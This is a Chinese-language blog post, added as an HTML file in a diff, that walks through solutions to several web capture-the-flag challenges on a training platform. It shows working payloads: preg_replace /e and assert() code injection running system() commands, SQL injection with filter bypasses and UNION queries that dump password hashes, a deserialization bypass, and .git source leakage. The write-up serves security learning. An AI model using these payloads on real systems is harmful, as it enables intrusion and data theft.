@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="安全" />
+   
+  <meta name="description" content="世中逢尔，雨中逢花" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    攻防世界WEB题解 |  李香兰的博客
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-攻防世界WEB题解" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  攻防世界WEB题解
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2019/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWEB%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time datetime="2019-12-13T07:01:03.000Z" itemprop="datePublished">2019-12-13</time>
+</a>
+      
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.9k字</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">13分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <p>see more?</p>
+<a id="more"></a>
+<h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>按照他的要求输入了loli.club(萝莉俱乐部？？)，什么都没有发生。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/nUoE8GAu2go2QHJpvwmmoSMa.qyDh5LY.ybHNPYOMPA!/b/dMUAAAAAAAAA&bo=SQVgAQAAAAADBw8!&rf=viewer_4" alt=""><br>因为题目名字为Cat，所以输入了Cat试试<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/h*a0bRwoh7JmCjR2pT3lCJu0lAtBBxvPNfCfAp10H*k!/b/dL8AAAAAAAAA&bo=hwSsAQAAAAADBww!&rf=viewer_4" alt=""><br>居然出现了报错，从报错来看出现了ping，联想到CTF中常出现的ping的命令执行，于是测试了一下他过滤了哪些截断符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  ;  |  - (  )  &#96;  ||  &amp;&amp;  &amp;  &#123;  &#125;  %0a(这个可以代替空格)</span><br></pre></td></tr></table></figure>
+<p>发现他把这些都进行的过滤，但是发现在输入<code>;</code>时，url中的分号被url编码了，通过在url中输入%80出现报错（因为url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。）<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/BbBlhC.Mr9HuWDZD.cNjgbITHBgC89EtgOnTh1Z4LXE!/b/dE0BAAAAAAAA&bo=SwV9AgAAAAADBxM!&rf=viewer_4" alt=""><br>通过报错信息我们发现了<code>/opt/api/dnsapi/views.py</code>而根据<code>php cur</code>，我们可以通过<code>@</code>进行文件传送，而这里因为超出了界限，所以会类似于%80将报错信息输出到网页中。构造url<code>http://111.198.29.45:57650/index.php?url=@/opt/api/dnsapi/views.py</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Z5ghxMd2DlyaqqEyjGk8dfdZ1D1lRMMuvrnUUheY*is!/b/dAgBAAAAAAAA&bo=VgVaAgAAAAADJwk!&rf=viewer_4" alt=""><br>发现database这个敏感词，访问目录得到flag<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Kv04JMxAnY0gR5HyO6ME2Sj.1wNTv4bvgDtpTbi.4hY!/b/dL4AAAAAAAAA&bo=VgUcAgAAAAADJ08!&rf=viewer_4" alt=""></p>
+<h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>访问题目什么提示都没有，查看源码，burp抓包也没有什么有用信息，通过目录扫描，发现存在index.phps，访问后发现是一段PHP代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">not allowed!</span><br><span class="line"></span><br><span class="line">&quot;); exit(); &#125; $_GET[id] &#x3D; urldecode($_GET[id]); if($_GET[id] &#x3D;&#x3D; &quot;admin&quot;) &#123; echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;; echo &quot;</span><br><span class="line"></span><br><span class="line">Key: xxxxxxx</span><br><span class="line">&quot;; &#125; ?&gt; Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
+<p>虽然代码不全，但是通过猜测，大概可以知道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]); if($_GET[id] &#x3D;&#x3D; &quot;admin&quot;) &#123; echo &quot;</span><br></pre></td></tr></table></figure>
+<p>这句话是让我们get一个id通过url解码之后等于admin，于是我们根据<a href="https://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">url编码表</a>把admin转换成<code>%2561dmin</code>（因为浏览器会自动解码一次url编码，所以需要编码两次）<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/cqqG..IypECoeaQ9d9QGx826B1HdL6DMmT3CzpKNvg4!/b/dLgAAAAAAAAA&bo=QQUtAQAAAAADB0o!&rf=viewer_4" alt=""></p>
+<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p>点开题目，发现是一个类型于工控的管理系统，看一看左边每一个按键<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/kjALqnLqeSo4z3**7QsN6Atf4o6GCoc6xW6VKBOlBbU!/b/dD4BAAAAAAAA&bo=VgWZAgAAAAADV7o!&rf=viewer_4" alt=""><br>发现除了报表中心，其他都没有用。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/eej5gaRzTCGwZ5tSLbcGnAe1F9cM0N22mDQqQUsEmho!/b/dFMBAAAAAAAA&bo=UQXGAQAAAAADJ5E!&rf=viewer_4" alt=""><br>发现无论怎么选择日期都没有用，观察到url中有一个参数<code>?id=1</code>，在尝试<code>&#39;</code>,<code>&lt;&gt;</code>等特殊字符（测试sql注入和xss）无效后，发现可以存在<code>?id=10000</code>又根据题目所说留了一处痕迹，于是尝试对<code>?id=1</code>进行爆破<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/ZeZLuxPpopvwj9FpLJTrOvMHfyeq6fj28zT14SQ0NOM!/b/dL4AAAAAAAAA&bo=WAO.AgAAAAADB8U!&rf=viewer_4" alt=""><br>根据爆破结果访问<code>?id=2333</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/3lp7oFYWk4a9gzGYM3JzFXbUPyinnDI.Y0f6XFfhzgw!/b/dMMAAAAAAAAA&bo=VgWPAQAAAAADJ98!&rf=viewer_4" alt=""></p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>访问题目，很明显是一道返序列化题目，而_wakeup这个魔法函数，如果传入的属性数量就不会执行，也就不会输出bad requests<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/QJrkOCAi3jECA7iS4sshtEuuFzUvuHFF5XnsMSvyLKE!/b/dDMBAAAAAAAA&bo=YwQXAQAAAAADB1M!&rf=viewer_4" alt=""><br>于是构造<code>?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>得到flag<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/bGOpPdWmIt6TiV128nyWtdlRmVe3dahNVh4eIzsSmHc!/b/dLgAAAAAAAAA&bo=RgUeAQAAAAADJ14!&rf=viewer_4" alt=""></p>
+<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>打开题目后，明显的一个搜索框，测试之后发现是post传输<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/xrBwMin6Xy1lFLo6PtYaXBiD0idouZywO*9pCKysM78!/b/dL4AAAAAAAAA&bo=VgVaAgAAAAADByk!&rf=viewer_4" alt=""><br>先随手测试一下SQLmap<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/C4UXoLXBpiI0JTMN5Zd.8GNz9l5TIbeqt.mq7qvGUG8!/b/dFQBAAAAAAAA&bo=4QMHAgAAAAADF9U!&rf=viewer_4" alt=""><br>没想到就直接出来了<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/MneYOHrDO59L5rKrO7Myw1qv3rBdHJmYmwbQxG7sDCo!/b/dLsAAAAAAAAA&bo=ywHRAAAAAAADFyk!&rf=viewer_4" alt=""></p>
+<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>访问页面，发现还是那个工控系统<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Q9Ppr.ms9JrcO5Abou39*xSFekdQwtWCbqh9hDCcqRg!/b/dDQBAAAAAAAA&bo=AgRKAgAAAAADB2w!&rf=viewer_4" alt=""><br>发现只有设备维护中心有东西<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/lxIchWSpuZLFysf0SELLML921VYTwe4lcwBUENDt6hY!/b/dIQAAAAAAAAA&bo=VgXdAQAAAAADJ40!&rf=viewer_4" alt=""><br>点击左上角的<code>云平台设备维护中心</code>发现url变成了<code>http://url/index.php?page=index</code>,根据此联想到PHP伪协议<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>成功读取到源码</p>
+<p>base64 解码后提取出关键代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一看到preg_replace就感到熟悉</p>
+<p><a href="https://www.runoob.com/php/php-preg_replace.html" target="_blank" rel="noopener">preg_replace函数解释</a></p>
+<p><a href="https://blog.csdn.net/zz_caleb/article/details/88660430" target="_blank" rel="noopener">preg_replace函数/e</a></p>
+<p><code>知识点：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</code></p>
+<p>所以构造<code>?pat=|.*|e&amp;rep=system(&quot;ls&quot;)&amp;sub=</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/BoYsP21FWQWkgm*vK.j8sY66.vwPR38lnlLWhpF8BVk!/b/dFQBAAAAAAAA&bo=ZQSAAgAAAAADF9E!&rf=viewer_4" alt=""><br>因为是在burp中所以空格需要使用+来代替，而url编码下需要使用%26来代替&amp;&amp;<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/VTXVn.CCuL33Mh5jtnFjI7GxaZc8xJBEA4pv8USwv.0!/b/dDUBAAAAAAAA&bo=ZQSAAgAAAAADF9E!&rf=viewer_4" alt=""><br>最后构造<code>/index.php?pat=|.*|e&amp;rep=system(&quot;cd+s3chahahaDir%26%26+cd+flag%26%26ls%26%26cat+flag.php&quot;)&amp;sub=</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/BwsYjrtUSkp0kYCcHW*HFG0QXK4Yx8tXbFmr54UBIc8!/b/dL8AAAAAAAAA&bo=ZQSAAgAAAAADF9E!&rf=viewer_4" alt=""></p>
+<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>进入题目后，点击about，发现给出提示Git，联想到.git泄露<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/MQ90PCW.BmOprjP9Or.4wAHDH17q*SbTcKsoZp0D00Y!/b/dL4AAAAAAAAA&bo=VgXzAQAAAAADB4M!&rf=viewer_4" alt=""><br>访问后，发现确实存在<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/v2Ppxxs9krnuDPCSp7UWuwqOYBubzc1CEZ4kbwAtD9I!/b/dLgAAAAAAAAA&bo=RwQrAgAAAAADJ2g!&rf=viewer_4" alt=""><br>于是使用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a>爬源码(注意，需要使用py2运行)<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/GEdedi644*WfCLx6GOxGog51ou6idqofZzi09qPRh78!/b/dLYAAAAAAAAA&bo=EAKdAAAAAAADF70!&rf=viewer_4" alt=""><br>在index.php中发现关键代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert() 检查一个断言是否为 FALSE</span><br><span class="line">strpos() 查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False，在这里用于过滤..&#x2F;这样的操作</span><br></pre></td></tr></table></figure>
+
+<p>此外<a href="https://www.php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">assert()</a>还进行执行代码</p>
+<p>所以我们闭合file，执行读取<br><code>/?page=1&#39;) or system(&quot;cat templates/flag.php&quot;);//</code><br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/Zzj*3rjMS86Nw0XF8IAqgzCypArWmZmNRqsM*PMaURc!/b/dLYAAAAAAAAA&bo=MAQ6AQAAAAADFz0!&rf=viewer_4" alt=""></p>
+<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件后，发现是一段JS代码，又因为是Web题，所以将后缀改为.html，打开。<br>发现有一个输入框<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/2ZfOvlkAoE8R*7606.rngPbwWFI9ifcRXjg8LocOu3M!/b/dL8AAAAAAAAA&bo=9AL0AAAAAAADByA!&rf=viewer_4" alt=""><br>修改源代码最后面的<code>eval()</code>为<code>alert()</code></p>
+<p>再次访问.html得到源码，整理之后如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;</span><br><span class="line">var e&#x3D;document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length&#x3D;&#x3D;16)</span><br><span class="line">	if(e.match(&#x2F;^be0f23&#x2F;)!&#x3D;null)</span><br><span class="line">		if(e.match(&#x2F;233ac&#x2F;)!&#x3D;null)</span><br><span class="line">			if(e.match(&#x2F;e98aa$&#x2F;)!&#x3D;null)</span><br><span class="line">				if(e.match(&#x2F;c7be9&#x2F;)!&#x3D;null)</span><br><span class="line">				&#123;</span><br><span class="line">					var t&#x3D;[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">					var n&#x3D;[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">					var r&#x3D;[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">					var i&#x3D;[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">					var s&#x3D;[t,n,r,i];</span><br><span class="line">					for(var o&#x3D;0;o&lt;13;++o)</span><br><span class="line">					&#123;</span><br><span class="line">						document.write(s[o%4][0]);</span><br><span class="line">						s[o%4].splice(0,1)</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#39;&lt;input id&#x3D;&quot;c&quot;&gt;&lt;button onclick&#x3D;$()&gt;Ok&lt;&#x2F;button&gt;&#39;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">^表示开头必须匹配到</span><br><span class="line">$表示结尾必须匹配到</span><br></pre></td></tr></table></figure>
+
+<p>最后的字符串为<code>be0f233ac7be98aa</code>,在输入框里输入（再把alert改回来），得到flag<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/8zYdtNEr05PuMcZVrnck7UrFZsRuDZphsDn9Slakdnw!/b/dMMAAAAAAAAA&bo=8gM4AQAAAAADF*o!&rf=viewer_4" alt=""></p>
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>注册后进入题目，根据题目名，以为是考的上传，于是开始了尝试绕过，几番周折无效后，<a href="https://blog.csdn.net/Yu_csdnstory/article/details/94750179" target="_blank" rel="noopener">参考</a>，发现居然是通过文件名作为注入。</p>
+<p><code>使用双写绕过对select和from的过滤</code></p>
+<p><code>使用十六进制才会有回显，所以使用CONV函数将16进制转换成10进制，CONV的使用是将第一个参数，从第二个参数的进制，转换成第三个参数的进制</code></p>
+<p><code>substr截过长，会用科学计数法表示，所以我们10个10个的截取</code></p>
+<p>于是构造</p>
+<p><code>a&#39;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&#39;.jpg</code></p>
+<p><code>a&#39;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&#39;.jpg</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),1,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),13,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),25,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(table_name) frofromm information_schema.tables where table_schema&#x3D;&#39;web_upload&#39;)),37,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39;)),1,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39;)),13,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+&#39;.jpg</span><br><span class="line"></span><br><span class="line">a&#39;+(selselectect CONV(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+&#39;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>注意，这里的<code>a&#39;</code>中的a可以是任意字符，但是不能使用数字，否则会出错。</p>
+<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>直接添加robots.txt即可获取flag</p>
+<h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>通过dirsearch发现存在.git源码泄露<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/SpimNfjAB*wMFxNbZ6owign94Cy9.FFgPTZLFaplXi0!/b/dLYAAAAAAAAA&bo=vAP0AQAAAAADB2g!&rf=viewer_4" alt=""><br>通过GITHACK获取源码<br><code>python2 githack.py -u http://111.198.29.45:55969/.git/</code><br>在api.php中发现关键代码<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/vg1tZciGsw92F3VkG3PoEtM3YCWJqAhrzdyqlTEtK.E!/b/dL4AAAAAAAAA&bo=VgV4AgAAAAADFxs!&rf=viewer_4" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为PHP中&#x3D;&#x3D;为弱类型比较，所以修改为true可以与任意数字相等</span><br></pre></td></tr></table></figure>
+<p>通过抓包修改为true，放到repeater里面多点几次钱就够了<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/hBzD1c9WIKjppAu8iCGCVfsmzyfx107QsoJqyWxBcrw!/b/dL8AAAAAAAAA&bo=IgPOAQAAAAADF9w!&rf=viewer_4" alt=""></p>
+<h3 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h3><p>打开题目后，发现有很多pdf，还是访问一下robots.txt。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/lSc02LhfQbLXPdQ30KYuTYuanGbizAcgzJSTZ.J9I0E!/b/dL8AAAAAAAAA&bo=qgRjAQAAAAADF*4!&rf=viewer_4" alt=""><br>访问login.php，简单测试一下发现报错（admin.php中无报错）<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/ku7SduZwPCcDcDjqtB0wQtxO.h8FgzB4X8nR3gdZgZY!/b/dIMAAAAAAAAA&bo=VgUbAgAAAAADJ0g!&rf=viewer_4" alt=""><br>放在sqlmap里面跑一下，<br>在sqlmap中并没有得到什么东西，右键查看源码时，发现一段莫名的东西<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code>，尝试添加到url中，得到源码，发现并没有什么过滤，那么为什么sqlmap跑不出东西呢。<br><img src="http://m.qpic.cn/psb?/V128qQJn1MQMtr/7RjyAAVgZalQVVkx6TAMYV8wkyMLey2nfWeg4pvux6A!/b/dL8AAAAAAAAA&bo=5wRkAgAAAAADJ4c!&rf=viewer_4" alt=""><br>尝试手动注入</p>
+<p><code>usr=%27 UNION SELECT id, name from Users limit 0,1--+&amp;pw=</code><br><code>usr=%27 UNION SELECT id, password from Users limit 0,1--+&amp;pw=</code><br><code>usr=%27 UNION SELECT id, hint from Users limit 0,1--+&amp;pw=</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+-------------------------------+--------+------------------------------------------+</span><br><span class="line">| id | hint                          | name   | password                                 |</span><br><span class="line">+----+-------------------------------+--------+------------------------------------------+</span><br><span class="line">| 1  | my fav word in my fav paper?! | admin  | 3fab54a50e770d830c0416df817567662a9dc85c |</span><br><span class="line">| 2  | my love is&#39;?                 | fritze | 54eae8935c90f467427f05e4ece82cf569f89507 |</span><br><span class="line">| 3  | the password is password      | hansi  | 34b0bb7c304949f9ff2fc101eef0f048be10d3bd |</span><br></pre></td></tr></table></figure>
+<p>根据提示，发现admin的密码为password的密文加密，而密文就在pdf的名字中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">re1 &#x3D; &#39;[a-fA-F0-9]&#123;32,32&#125;.pdf&#39;</span><br><span class="line">re2 &#x3D; &#39;[0-9\&#x2F;]&#123;2,2&#125;index.html&#39;</span><br><span class="line"></span><br><span class="line">pdf_list &#x3D; []</span><br><span class="line">def get_pdf(url):</span><br><span class="line">    global pdf_list </span><br><span class="line">    print url</span><br><span class="line">    req &#x3D; requests.get(url).text</span><br><span class="line">    re_1 &#x3D; re.findall(re1,req)</span><br><span class="line">    for i in re_1:</span><br><span class="line">        pdf_url &#x3D; url+i</span><br><span class="line">        pdf_list.append(pdf_url)</span><br><span class="line">    re_2 &#x3D; re.findall(re2,req)</span><br><span class="line">    for j in re_2:</span><br><span class="line">        new_url &#x3D; url+j[0:2]</span><br><span class="line">        get_pdf(new_url)</span><br><span class="line">    return pdf_list</span><br><span class="line">    # return re_2</span><br><span class="line"></span><br><span class="line">pdf_list &#x3D; get_pdf(&#39;http:&#x2F;&#x2F;111.198.29.45:38829&#39;)</span><br><span class="line">print pdf_list</span><br><span class="line"># for i in pdf_list:</span><br><span class="line">#     os.system(&#39;wget &#39;+i)</span><br></pre></td></tr></table></figure>
